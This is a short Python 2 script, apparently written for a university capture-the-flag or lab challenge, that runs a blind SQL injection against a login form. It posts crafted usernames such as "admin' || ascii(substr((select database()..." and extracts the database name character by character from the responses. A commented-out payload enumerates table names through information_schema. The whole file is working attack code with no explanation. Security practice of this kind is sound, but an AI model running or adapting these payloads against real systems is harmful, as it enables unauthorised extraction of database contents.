# # -*- coding:utf-8 -*-

import requests
import string
import datetime
import time

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
url = "http://sec2.hdu.edu.cn/ac5c74b64b4b8352ef2f181affb5ac2a/"

data = string.digits+string.lowercase

length = ""
def load(url):
    global length
    for j in range(1,10):
        for i in xrange(48,126):
            datas = {
                    'username':"admin' || ascii(substr((select database()limit 0,1),{a},1))={b} #".format(a=j,b=i),
                    # 'username':"admin' || ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 3,1),{a},1))={b} #".format(a=j,b=i),
                    'password':'1'
            }
            r = requests.get(url,headers=header)
            # starttime = datetime.datetime.now()
            response = requests.post(url=url,headers=header,data=datas)
            # response=response.text
            # endtime = datetime.datetime.now()
            if 'password' not in response.content:
                length = length+chr(i)
                print length
                break

load (url)